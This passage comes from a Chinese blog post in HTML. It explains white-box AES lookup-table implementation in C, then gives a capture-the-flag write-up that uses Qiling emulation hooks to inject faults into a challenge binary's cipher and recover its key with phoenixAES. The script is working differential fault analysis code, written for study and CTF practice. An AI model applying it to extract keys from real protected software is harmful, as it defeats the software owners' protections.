xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>T</mi><msub><mi>y</mi><mn>0</mn></msub><mo>∘</mo><msubsup><mi>T</mi><mn>0</mn><mn>1</mn></msubsup><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>T</mi><msub><mi>y</mi><mn>0</mn></msub><mrow><mo fence="true">(</mo><msubsup><mi>T</mi><mn>0</mn><mn>1</mn></msubsup><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">Ty_0\circ T_0^1\left(x\right)=Ty_0\left(T_0^1\left(x\right)\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2141179999999998em;vertical-align:-0.35001em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></span></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">u32 TyiBoxes[<span class="hljs-number">9</span>][<span class="hljs-number">16</span>][<span class="hljs-number">256</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">GetTyiBoxs</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> r = <span class="hljs-number">0</span>; r &lt; <span class="hljs-number">9</span>; r++)&#123; <span class="hljs-comment">//加密轮数，对照列混合次数</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span>  index = <span class="hljs-number">0</span>; index &lt; <span class="hljs-number">16</span>; index++)&#123; <span class="hljs-comment">//对于16个字节</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; <span class="hljs-number">256</span>; x++)&#123; <span class="hljs-comment">//对于2^8种可能</span><br>u8 t = TBoxes[r][index][x]; <span class="hljs-comment">//首先经过T-boxs一遍</span><br>TyiBoxes[r][index][x] = TyiTables[index % <span class="hljs-number">4</span>][t]; <span class="hljs-comment">//这里再Tyi_tables一遍，由于这里列混合是将一列的数据查表用一张表表示，所以这里 %4</span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>​整个AES加密流程可以通过Tyiboxs,XORTables,TBoxes三个表实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//u32 TyiBoxes[9][16][256];</span><br><span class="hljs-comment">//u8 xorTable[9][96][16][16]</span><br><span class="hljs-comment">//u8 TBoxes[10][16][256];</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Table_encrypt</span><span class="hljs-params">(u8 input[<span class="hljs-number">16</span>], u8 output[<span class="hljs-number">16</span>])</span> &#123;<br>u32 a, b, c, d, aa, bb, cc, dd;<span class="hljs-comment">//这里aa,bb,cc,dd开这么大我是不理解的，他们作为xorTable的结果，只用4bit即可，直接用u8就可以，用u32占用空间(这里观察好几个白盒AES算法都是u32所以觉得不合理)</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) &#123;<span class="hljs-comment">// 前9轮加密，因为列混合共9次</span><br>shiftRows(input);<span class="hljs-comment">// 首先进行行位移</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<span class="hljs-comment">// 对应着列混合的4种规则，每4个字节使用一张表。所以这里将4个使用不同表的数据放在一起</span><br>a = TyiBoxes[i][<span class="hljs-number">4</span> * j + <span class="hljs-number">0</span>][input[<span class="hljs-number">4</span> * j + <span class="hljs-number">0</span>]];<br>b = TyiBoxes[i][<span class="hljs-number">4</span> * j + <span class="hljs-number">1</span>][input[<span class="hljs-number">4</span> * j + <span class="hljs-number">1</span>]];<br>c = TyiBoxes[i][<span class="hljs-number">4</span> * j + <span class="hljs-number">2</span>][input[<span class="hljs-number">4</span> * j + <span class="hljs-number">2</span>]];<br>d = TyiBoxes[i][<span class="hljs-number">4</span> * j + <span class="hljs-number">3</span>][input[<span class="hljs-number">4</span> * j + <span class="hljs-number">3</span>]];<span class="hljs-comment">// 中间的索引对应密钥，后面的索引对应着明文的8bit输入</span><br>aa = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">0</span>][(a &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0xf</span>][(b &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0xf</span>];<br>bb = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">1</span>][(c &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0xf</span>][(d &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0xf</span>];<br>cc = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">2</span>][(a &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xf</span>][(b &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xf</span>];<br>dd = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">3</span>][(c &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xf</span>][(d &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xf</span>];<span class="hljs-comment">// 这里选取了列混合的4张表(24*j+?)，然后由于xorTable是4bit进行异或的，所以这里只取4个32bit结果的每4bit进行处理，这里总共处理了2次</span><br>input[<span class="hljs-number">4</span> * j + <span class="hljs-number">0</span>] = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">4</span>][aa][bb] &lt;&lt; <span class="hljs-number">4</span> | xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">5</span>][cc][dd];<span class="hljs-comment">// 这里和上面的两次处理是同一批的，aa/cc与bb/dd处理了前后的异或，然后在这里完成最后的异或，共异或3次。之后再进行拼接，形成8bit数据放入指定位置 </span><br>aa = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">6</span>][(a &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0xf</span>][(b &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0xf</span>];<br>bb = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">7</span>][(c &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0xf</span>][(d &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0xf</span>];<br>cc = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">8</span>][(a &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xf</span>][(b &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xf</span>];<br>dd = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">9</span>][(c &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xf</span>][(d &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xf</span>];<br>input[<span class="hljs-number">4</span> * j + <span class="hljs-number">1</span>] = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">10</span>][aa][bb] &lt;&lt; <span class="hljs-number">4</span> | xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">11</span>][cc][dd];<br>aa = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">12</span>][(a &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0xf</span>][(b &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0xf</span>];<br>bb = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">13</span>][(c &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0xf</span>][(d &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0xf</span>];<br>cc = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">14</span>][(a &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xf</span>][(b &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xf</span>];<br>dd = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">15</span>][(c &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xf</span>][(d &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xf</span>];<br>input[<span class="hljs-number">4</span> * j + <span class="hljs-number">2</span>] = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">16</span>][aa][bb] &lt;&lt; <span class="hljs-number">4</span> | xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">17</span>][cc][dd];<br>aa = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">18</span>][(a &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xf</span>][(b &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xf</span>];<br>bb = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">19</span>][(c &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xf</span>][(d &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xf</span>];<br>cc = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">20</span>][(a &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xf</span>][(b &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xf</span>];<br>dd = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">21</span>][(c &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xf</span>][(d &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xf</span>];<br>input[<span class="hljs-number">4</span> * j + <span class="hljs-number">3</span>] = xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">22</span>][aa][bb] &lt;&lt; <span class="hljs-number">4</span> | xorTable[i][<span class="hljs-number">24</span> * j + <span class="hljs-number">23</span>][cc][dd];<br>&#125;<br>&#125;<br><span class="hljs-comment">//第十轮</span><br>shiftRows(input);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">16</span>; j++) &#123;<br>input[j] = TBoxes[<span class="hljs-number">9</span>][j][input[j]];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>    output[i] = input[i];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="感想"><a class="markdownIt-Anchor" href="#感想"></a> 感想</h2><p>​这里白盒AES就了解的差不多了。经过理解，我感觉它确实起到了混淆想要去理解人的效果。主要理解难点我觉得有两个，一个是列混合那里，这个可以查看普通AES的查表操作来辅助理解，两个的思路是一样的。然后就是代码问题，它这里为了迎合循环次数而将一个表复制多次组成一个大表的操作，我是真的欣赏不来，当然这个也可能是它对比直接查表和索引之后得到的最优解，由于我没有具体分析，所以我只是简单抱怨一下。</p><h1 id="例题分析"><a class="markdownIt-Anchor" href="#例题分析"></a> 例题分析</h1><h2 id="2023巅峰极客"><a class="markdownIt-Anchor" href="#2023巅峰极客"></a> 2023巅峰极客</h2><blockquote><p>m1_read，这里主要是记录白盒AES的处理</p></blockquote><h3 id="qiling模拟执行"><a class="markdownIt-Anchor" href="#qiling模拟执行"></a> QiLing模拟执行</h3><p>​该程序主要调用 <code>sub_140004BF0</code> 来进行白盒AES加密，由此我们的目的就是模拟执行函数 <code>sub_140004BF0</code> 来插入缺陷数据并获取错误密文，这里根据分析，需要 16 组错误的密文才能恢复原始密钥。</p><h4 id="参数传入"><a class="markdownIt-Anchor" href="#参数传入"></a> 参数传入</h4><p>​这里的 <code>rcx</code> 存储着输入的地址，即传入的第一个参数的地址(没有读卡器，从别的 WP 中获取的信息)。模拟执行该函数，需要在函数起始地址修改寄存器的值，使其指向我在其余内存中初始化的<code>输入</code>，从而到达构造输入的目的。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401242211672.png" alt="image-20230724213132695" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_args</span>(<span class="hljs-params">ql: Qiling</span>):<br>    ql.mem.write(<span class="hljs-number">0x500000000</span>, <span class="hljs-string">b&quot;\x01&quot;</span> * <span class="hljs-number">16</span>) <span class="hljs-comment"># 在虚拟内存地址0x500000000(不干扰程序的内存空间)处写入一个16字节的字节序列，这是在向指定地址写⼊需要加密的内容</span><br>    ql.arch.regs.write(<span class="hljs-string">&quot;rcx&quot;</span>, <span class="hljs-number">0x500000000</span>) <span class="hljs-comment"># 将0x500000000处内存写入rcx寄存器</span><br>    ql.mem.write(<span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">16</span>)<br>    ql.arch.regs.write(<span class="hljs-string">&quot;rdx&quot;</span>, <span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x10</span>)<br>    ql.mem.write(<span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x20</span>, <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">16</span>)<br>    ql.arch.regs.write(<span class="hljs-string">&quot;rbx&quot;</span>, <span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x20</span>)<br>    <span class="hljs-keyword">return</span><br><br>start_addr = <span class="hljs-number">0x140004BF0</span> <span class="hljs-comment"># 函数起始位置</span><br>ql.hook_address(hook_args, start_addr) <span class="hljs-comment"># ql的hook功能，第一个参数是hook函数，第二个是hook起始地址</span><br></code></pre></td></tr></table></figure><h4 id="定位插入缺陷数据的位置"><a class="markdownIt-Anchor" href="#定位插入缺陷数据的位置"></a> 定位插入缺陷数据的位置</h4><p>​首先确认 AES 最后两次列混合的位置，这里分为了前9轮和第10轮两种，那么最后两次列混合就在第8轮与第9轮之间，这里可知第九轮为<code>v4 == 0x9000</code> ，则需要在第八轮后，即 <code>v4 == 0x8000 ---- r12 == 8000h </code> 的位置之后插入缺陷数据。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401242345399.png" alt="image-20230724201323127" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401242345461.png" alt="image-20230724201532610" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">index = <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_code</span>(<span class="hljs-params">ql: Qiling</span>):<br>    <span class="hljs-keyword">if</span> ql.arch.regs.read(<span class="hljs-string">&quot;r12&quot;</span>) == <span class="hljs-number">0x8000</span>:<br>        <span class="hljs-keyword">global</span> index <span class="hljs-comment"># 定义为全局变量</span><br>        ql.mem.write(<span class="hljs-number">0x500000000</span> + index, <span class="hljs-string">b&quot;\x00&quot;</span>) <span class="hljs-comment"># 这里的 b&quot;\x00&quot; 就是插入的残缺数据，往这里写东西就是往 rcx 中写东西，即第一个参数的值被修改了</span><br>        index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span><br>index_addr = <span class="hljs-number">0x1400052c5</span> <span class="hljs-comment">#这个地址就是判断是否到第九次的地址</span><br>ql.hook_address(hook_code, index_addr)<br></code></pre></td></tr></table></figure><p>​这里 <code>ql.mem.write(0x500000000 + index, b&quot;\x00&quot;)</code> 与后面的16次循环都是为了插入缺陷数据而服务的，但是还需要一个正确的第10轮之后的密钥，所以不再加上这个语句和16个循环再单独执行一遍。</p><h4 id="获取密文"><a class="markdownIt-Anchor" href="#获取密文"></a> 获取密文</h4><p>​这里 a1 存储的就是密文，也就是 rax 存储的位置，而 rcx 则存储着自己输入的明文加密出来的结果，所以最后在 rax 处获取自己构造的错误密文(因为知道整个算法的逻辑，输入一个指定的明文会得到一个知道的密文，然后错误传播就是在第8次与第9次列混合之间插入数据，通过错误的密文来得到密钥的信息)。(先不关注最后的 xor 0x66)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401242354753.png" alt="image-20240124235448701" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401242356738.png" alt="image-20240124235601706" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_enc</span>(<span class="hljs-params">ql: Qiling</span>):<br><span class="hljs-built_in">print</span>(ql.mem.read(<span class="hljs-number">0x500000000</span>, <span class="hljs-number">16</span>).<span class="hljs-built_in">hex</span>()) <span class="hljs-comment"># 获取 rcx 对应内存地址的密文</span><br><span class="hljs-keyword">return</span><br><br>enc_after = <span class="hljs-number">0x1400053CA</span><br>ql.hook_address(hook_enc, enc_after)<br></code></pre></td></tr></table></figure><h4 id="获取所有错误密文"><a class="markdownIt-Anchor" href="#获取所有错误密文"></a> 获取所有错误密文</h4><p>​通过函数的执行，错误密文与自己构造的密文相比，只有4个字节不同，证实了DFA起效。那么就来只需要逐字节来插入缺陷数据即可得到所有的错误密文。这里通过更改 <code>index</code> 的值来逐字节插入缺陷数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> qiling <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> qiling.const <span class="hljs-keyword">import</span> QL_VERBOSE<br><br>index = <span class="hljs-number">0</span><br>ql = Qiling(<br>    [<span class="hljs-string">&quot;E:\\reverse\\source\\frame\\qiling\\examples\\rootfs\\x8664_windows\\m1_read.exe&quot;</span>],<br>    <span class="hljs-string">r&quot;E:\\reverse\\source\\frame\\qiling\\examples\\rootfs\\x8664_windows&quot;</span>,<br>    verbose=QL_VERBOSE.OFF,<br>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_args</span>(<span class="hljs-params">ql: Qiling</span>):<br>    ql.mem.write(<span class="hljs-number">0x500000000</span>, <span class="hljs-string">b&quot;abcdefghijklmnop&quot;</span>)<br>    ql.arch.regs.write(<span class="hljs-string">&quot;rcx&quot;</span>, <span class="hljs-number">0x500000000</span>)<br>    ql.mem.write(<span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">16</span>)<br>    ql.arch.regs.write(<span class="hljs-string">&quot;rdx&quot;</span>, <span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x10</span>)<br>    ql.mem.write(<span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x20</span>, <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">16</span>)<br>    ql.arch.regs.write(<span class="hljs-string">&quot;rbx&quot;</span>, <span class="hljs-number">0x500000000</span> + <span class="hljs-number">0x20</span>)<br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_code</span>(<span class="hljs-params">ql: Qiling</span>):<br>    <span class="hljs-keyword">if</span> ql.arch.regs.read(<span class="hljs-string">&quot;r12&quot;</span>) == <span class="hljs-number">0x8000</span>:<br>        <span class="hljs-keyword">global</span> index<br>        ql.mem.write(<span class="hljs-number">0x500000000</span> + index, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>        index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_enc</span>(<span class="hljs-params">ql: Qiling</span>):<br>    <span class="hljs-built_in">print</span>(ql.mem.read(<span class="hljs-number">0x500000000</span>, <span class="hljs-number">16</span>).<span class="hljs-built_in">hex</span>())<br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    index_addr = <span class="hljs-number">0x1400052C5</span><br>    start_addr = <span class="hljs-number">0x140004BF0</span><br>    end_addr = <span class="hljs-number">0x14000542D</span><br>    enc_after = <span class="hljs-number">0x1400053CA</span><br>    ql.hook_address(hook_args, start_addr)<br>    ql.hook_address(hook_code, index_addr)<br>    ql.hook_address(hook_enc, enc_after)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        ql.run(begin=start_addr, end=end_addr)<span class="hljs-comment"># 通过 golbal来对于index的值进行修改，从而插入缺陷数据到不同的位置</span><br></code></pre></td></tr></table></figure><p>​运行得到16组错误密文</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401251138859.png" alt="image-20240125113810812" /></p><h4 id="获取正确第10轮密文"><a class="markdownIt-Anchor" href="#获取正确第10轮密文"></a> 获取正确第10轮密文</h4><p>​将获取所有错误密文代码中 <code>ql.hook_address(hook_code, index_addr)注释</code> ，然后 <code>将16轮循环改为一轮</code> ，之后代码就可以通过 <code>hook_enc</code> 来得到构造的正确密文。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401251135686.png" alt="image-20240125113505529" /></p><h4 id="获得原始密钥"><a class="markdownIt-Anchor" href="#获得原始密钥"></a> 获得原始密钥</h4><p>​得到16个错误密文，再加上一个正确的密文，就可以获得第10轮的密钥。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> phoenixAES<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tracefile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> t: <span class="hljs-comment"># 第一组为正确密文，后面16组是错误密文</span><br>    t.write(<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    c3af71addfe4fcac6941286a76ddedc2</span><br><span class="hljs-string">    45af71addfe4fcee6941546a76b1edc2</span><br><span class="hljs-string">    c3af717cdfe440ac69a6286aa2ddedc2</span><br><span class="hljs-string">    c3af8baddf45fcac4141286a76dded22</span><br><span class="hljs-string">    c34271ad40e4fcac6941289b76ddc5c2</span><br><span class="hljs-string">    c3e871adace4fcac694128a776dd3fc2</span><br><span class="hljs-string">    1daf71addfe4fc4a6941c76a760aedc2</span><br><span class="hljs-string">    c3af7164dfe448ac6998286a35ddedc2</span><br><span class="hljs-string">    c3af43addf7cfcac5741286a76dded8c</span><br><span class="hljs-string">    c3afe6addfc9fcaced41286a76dded5b</span><br><span class="hljs-string">    c31071ad73e4fcac694128c576dd4cc2</span><br><span class="hljs-string">    4baf71addfe4fc266941806a7652edc2</span><br><span class="hljs-string">    